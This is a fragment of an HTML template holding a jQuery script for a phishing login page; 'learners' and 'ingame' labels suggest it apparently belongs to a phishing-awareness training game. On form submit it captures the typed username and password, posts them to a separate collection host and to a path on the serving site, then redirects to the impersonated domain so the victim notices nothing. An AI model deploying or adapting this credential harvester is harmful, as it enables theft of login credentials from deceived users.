                <script>
                        $(document).ready(function () {
                                function sendform(learners, target) {
                                        var username =
                                                document.getElementById(
                                                        'user',
                                                ).value;
                                        var password =
                                                document.getElementById(
                                                        'password',
                                                ).value;

                                        const notification = new Promise(
                                                (resolve, reject) => {
                                                        $.ajax({
                                                                url: `https://${learners}:5000/notifications/ingame`,
                                                                type: 'POST',
                                                                headers: {
                                                                        'Content-Type':
                                                                                'application/json',
                                                                },
                                                                data: JSON.stringify(
                                                                        {
                                                                                message: `<h3>### Phishing ###</h3><br><hl><br>User: ${username}<br>Password:${password}`,
                                                                        },
                                                                ),
                                                                success: (
                                                                        response,
                                                                ) => {
                                                                        resolve(
                                                                                response,
                                                                        );
                                                                },
                                                                error: (
                                                                        xhr,
                                                                        status,
                                                                        error,
                                                                ) => {
                                                                        reject(
                                                                                error,
                                                                        );
                                                                },
                                                        });
                                                },
                                        );

                                        const trap = new Promise(
                                                (resolve, reject) => {
                                                        $.ajax({
                                                                url: `/${username}/${password}`,
                                                                type: 'GET',
                                                                success: (
                                                                        response,
                                                                ) => {
                                                                        resolve(
                                                                                response,
                                                                        );
                                                                },
                                                                error: (
                                                                        xhr,
                                                                        status,
                                                                        error,
                                                                ) => {
                                                                        reject(
                                                                                error,
                                                                        );
                                                                },
                                                        });
                                                },
                                        );

                                        Promise.all([notification, trap])
                                                .then((responses) => {
                                                        window.location.href =
                                                                target;
                                                })
                                                .catch((error) => {
                                                        window.location.href =
                                                                target;
                                                });
                                }

                                $('form').submit(function (event) {
                                        event.preventDefault();
                                        sendform(
                                                '{{ auth_url }}',
                                                '{{ item.original_domain }}',
                                        );
                                });
                        });
